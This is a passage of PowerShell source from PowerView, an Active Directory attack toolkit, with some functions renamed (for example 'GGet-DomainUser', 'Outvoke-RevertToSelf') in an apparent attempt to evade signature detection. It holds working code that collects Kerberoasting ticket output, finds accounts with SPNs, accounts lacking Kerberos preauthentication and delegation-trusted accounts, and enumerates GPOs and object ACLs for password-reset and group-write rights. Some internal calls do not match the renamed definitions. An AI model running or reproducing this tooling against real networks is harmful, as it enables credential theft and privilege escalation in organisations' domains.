                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                Write-Output $Out
            }
            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
        }
    }

    END {
        if ($LogonToken) {
            Outvoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}

function GGet-DomainUser {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $AllowDelegation,

        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $DisallowDelegation,

        [Switch]
        $TrustedToAuth,

        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $PreauthNotRequired,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )
    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $UserSearcher = GGet-DomainSearcher @SearcherArguments
    }

    PROCESS {

        if ($UserSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^CN=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[GGet-DomainUser] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $UserSearcher = GGet-DomainSearcher @SearcherArguments
                        if (-not $UserSearcher) {
                            Write-Warning "[GGet-DomainUser] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('\')) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $UserDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                        $UserName = $IdentityInstance.Split('\')[1]
                        $IdentityFilter += "(samAccountName=$UserName)"
                        $SearcherArguments['Domain'] = $UserDomain
                        Write-Verbose "[GGet-DomainUser] Extracted domain '$UserDomain' from '$IdentityInstance'"
                        $UserSearcher = GGet-DomainSearcher @SearcherArguments
                    }
                }
                else {
                    $IdentityFilter += "(samAccountName=$IdentityInstance)"
                }
            }

            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[GGet-DomainUser] Searching for non-null service principal names'
                $Filter += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[GGet-DomainUser] Searching for users who can be delegated'
                $Filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[GGet-DomainUser] Searching for users who are sensitive and not trusted for delegation'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[GGet-DomainUser] Searching for adminCount=1'
                $Filter += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[GGet-DomainUser] Searching for users that are trusted to authenticate for other principals'
                $Filter += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[GGet-DomainUser] Searching for user accounts that do not require kerberos preauthenticate'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[GGet-DomainUser] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            $UserSearcher.filter = "(&(samAccountType=805306368)$Filter)"
            Write-Verbose "[GGet-DomainUser] filter string: $($UserSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $UserSearcher.FindOne() }
            else { $Results = $UserSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = CConvert-LDAPProperty -Properties $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[GGet-DomainUser] Error disposing of the Results object: $_"
                }
            }
            $UserSearcher.dispose()
        }
    }
}

function Get-DomainGPO {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerIdentity,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $GPOSearcher = GGet-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($GPOSearcher) {
            if ($PSBoundParameters['ComputerIdentity'] -or $PSBoundParameters['UserIdentity']) {
                $GPOAdsPaths = @()
                if ($SearcherArguments['Properties']) {
                    $OldProperties = $SearcherArguments['Properties']
                }
                $SearcherArguments['Properties'] = 'distinguishedname,dnshostname'
                $TargetComputerName = $Null

                if ($PSBoundParameters['ComputerIdentity']) {
                    $SearcherArguments['Identity'] = $ComputerIdentity
                    $Computer = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $Computer) {
                        Write-Verbose "[Get-DomainGPO] Computer '$ComputerIdentity' not found!"
                    }
                    $ObjectDN = $Computer.distinguishedname
                    $TargetComputerName = $Computer.dnshostname
                }
                else {
                    $SearcherArguments['Identity'] = $UserIdentity
                    $User = Get-DomainUser @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $User) {
                        Write-Verbose "[Get-DomainGPO] User '$UserIdentity' not found!"
                    }
                    $ObjectDN = $User.distinguishedname
                }

                # extract all OUs the target user/computer is a part of
                $ObjectOUs = @()
                $ObjectOUs += $ObjectDN.split(',') | ForEach-Object {
                    if($_.startswith('OU=')) {
                        $ObjectDN.SubString($ObjectDN.IndexOf("$($_),"))
                    }
                }
                Write-Verbose "[Get-DomainGPO] object OUs: $ObjectOUs"

                if ($ObjectOUs) {
                    # find all the GPOs linked to the user/computer's OUs
                    $SearcherArguments.Remove('Properties')
                    $InheritanceDisabled = $False
                    ForEach($ObjectOU in $ObjectOUs) {
                        $SearcherArguments['Identity'] = $ObjectOU
                        $GPOAdsPaths += Get-DomainOU @SearcherArguments | ForEach-Object {
                            # extract any GPO links for this particular OU the computer is a part of
                            if ($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $Parts = $_.split(';')
                                        $GpoDN = $Parts[0]
                                        $Enforced = $Parts[1]

                                        if ($InheritanceDisabled) {
                                            # if inheritance has already been disabled and this GPO is set as "enforced"
                                            #   then add it, otherwise ignore it
                                            if ($Enforced -eq 2) {
                                                $GpoDN
                                            }
                                        }
                                        else {
                                            # inheritance not marked as disabled yet
                                            $GpoDN
                                        }
                                    }
                                }
                            }

                            # if this OU has GPO inheritence disabled, break so additional OUs aren't processed
                            if ($_.gpoptions -eq 1) {
                                $InheritanceDisabled = $True
                            }
                        }
                    }
                }

                if ($TargetComputerName) {
                    # find all the GPOs linked to the computer's site
                    $ComputerSite = (Get-NetComputerSiteName -ComputerName $TargetComputerName).SiteName
                    if($ComputerSite -and ($ComputerSite -notlike 'Error*')) {
                        $SearcherArguments['Identity'] = $ComputerSite
                        $GPOAdsPaths += Get-DomainSite @SearcherArguments | ForEach-Object {
                            if($_.gplink) {
                                # extract any GPO links for this particular site the computer is a part of
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }

                # find any GPOs linked to the user/computer's domain
                $ObjectDomainDN = $ObjectDN.SubString($ObjectDN.IndexOf('DC='))
                $SearcherArguments.Remove('Identity')
                $SearcherArguments.Remove('Properties')
                $SearcherArguments['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
                $GPOAdsPaths += Get-DomainObject @SearcherArguments | ForEach-Object {
                    if($_.gplink) {
                        # extract any GPO links for this particular domain the computer is a part of
                        $_.gplink.split('][') | ForEach-Object {
                            if ($_.startswith('LDAP')) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose "[Get-DomainGPO] GPOAdsPaths: $GPOAdsPaths"

                # restore the old properites to return, if set
                if ($OldProperties) { $SearcherArguments['Properties'] = $OldProperties }
                else { $SearcherArguments.Remove('Properties') }
                $SearcherArguments.Remove('Identity')

                $GPOAdsPaths | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
                    # use the gplink as an ADS path to enumerate all GPOs for the computer
                    $SearcherArguments['SearchBase'] = $_
                    $SearcherArguments['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
                    Get-DomainObject @SearcherArguments | ForEach-Object {
                        if ($PSBoundParameters['Raw']) {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                        }
                        $_
                    }
                }
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match 'LDAP://|^CN=.*') {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                            #   and rebuild the domain searcher
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGPO] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            $SearcherArguments['Domain'] = $IdentityDomain
                            $GPOSearcher = GGet-DomainSearcher @SearcherArguments
                            if (-not $GPOSearcher) {
                                Write-Warning "[Get-DomainGPO] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif ($IdentityInstance -match '{.*}') {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                    else {
                        try {
                            $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                            $IdentityFilter += "(objectguid=$GuidByteString)"
                        }
                        catch {
                            $IdentityFilter += "(displayname=$IdentityInstance)"
                        }
                    }
                }
                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGPO] Using additional LDAP filter: $LDAPFilter"
                    $Filter += "$LDAPFilter"
                }

                $GPOSearcher.filter = "(&(objectCategory=groupPolicyContainer)$Filter)"
                Write-Verbose "[Get-DomainGPO] filter string: $($GPOSearcher.filter)"

                if ($PSBoundParameters['FindOne']) { $Results = $GPOSearcher.FindOne() }
                else { $Results = $GPOSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        # return raw result objects
                        $GPO = $_
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                    }
                    else {
                        if ($PSBoundParameters['SearchBase'] -and ($SearchBase -Match '^GC://')) {
                            $GPO = CConvert-LDAPProperty -Properties $_.Properties
                            try {
                                $GPODN = $GPO.distinguishedname
                                $GPODomain = $GPODN.SubString($GPODN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                $gpcfilesyspath = "\\$GPODomain\SysVol\$GPODomain\Policies\$($GPO.cn)"
                                $GPO | Add-Member Noteproperty 'gpcfilesyspath' $gpcfilesyspath
                            }
                            catch {
                                Write-Verbose "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
                            }
                        }
                        else {
                            $GPO = CConvert-LDAPProperty -Properties $_.Properties
                        }
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                    }
                    $GPO
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainGPO] Error disposing of the Results object: $_"
                    }
                }
                $GPOSearcher.dispose()
            }
        }
    }
}

function Get-DomainObjectAcl {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Switch]
        $Sacl,

        [Switch]
        $ResolveGUIDs,

        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }

        if ($PSBoundParameters['Sacl']) {
            $SearcherArguments['SecurityMasks'] = 'Sacl'
        }
        else {
            $SearcherArguments['SecurityMasks'] = 'Dacl'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $Searcher = GGet-DomainSearcher @SearcherArguments

        $DomainGUIDMapArguments = @{}
        if ($PSBoundParameters['Domain']) { $DomainGUIDMapArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $DomainGUIDMapArguments['Server'] = $Server }
        if ($PSBoundParameters['ResultPageSize']) { $DomainGUIDMapArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $DomainGUIDMapArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $DomainGUIDMapArguments['Credential'] = $Credential }

        # get a GUID -> name mapping
        if ($PSBoundParameters['ResolveGUIDs']) {
            $GUIDs = Get-DomainGUIDMap @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if ($Searcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-.*') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^(CN|OU|DC)=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainObjectAcl] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $Searcher = GGet-DomainSearcher @SearcherArguments
                        if (-not $Searcher) {
                            Write-Warning "[Get-DomainObjectAcl] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainObjectAcl] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            if ($Filter) {
                $Searcher.filter = "(&$Filter)"
            }
            Write-Verbose "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Searcher.filter)"

            $Results = $Searcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $Object = $_.Properties

                if ($Object.objectsid -and $Object.objectsid[0]) {
                    $ObjectSid = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    $ObjectSid = $Null
                }

                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                        if ($PSBoundParameters['RightsFilter']) {
                            $GuidFilter = Switch ($RightsFilter) {
                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                                Default { '00000000-0000-0000-0000-000000000000' }
                            }
                            if ($_.ObjectType -eq $GuidFilter) {
                                $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid
                                $Continue = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid
                            $Continue = $True
                        }

                        if ($Continue) {
                            $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($GUIDs) {
                                # if we're resolving GUIDs, map them them to the resolved hash table
                                $AclProperties = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                        try {
                                            $AclProperties[$_.Name] = $GUIDs[$_.Value.toString()]
                                        }
                                        catch {
                                            $AclProperties[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $AclProperties[$_.Name] = $_.Value
                                    }
                                }
                                $OutObject = New-Object -TypeName PSObject -Property $AclProperties
                                $OutObject.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $OutObject
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "[Get-DomainObjectAcl] Error: $_"
                }
            }
        }
    }
}

function Get-DomainSID {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $SearcherArguments = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
    if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

    $DCSID = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1 -ExpandProperty objectsid

    if ($DCSID) {
        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
    }
    else {
        Write-Verbose "[Get-DomainSID] Error extracting domain SID for '$Domain'"
    }
}

function Get-DomainComputer {

    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $Identity,

        [Switch]
        $Unconstrained,

        [Switch]
        $TrustedToAuth,

        [Switch]
        $Printers,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        $SPN,

        [ValidateNotNullOrEmpty()]
        [String]
        $OperatingSystem,

        [ValidateNotNullOrEmpty()]
        [String]
        $ServicePack,

        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,

        [Switch]
        $Ping,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        # add in the negations
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        # create new dynamic parameter
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
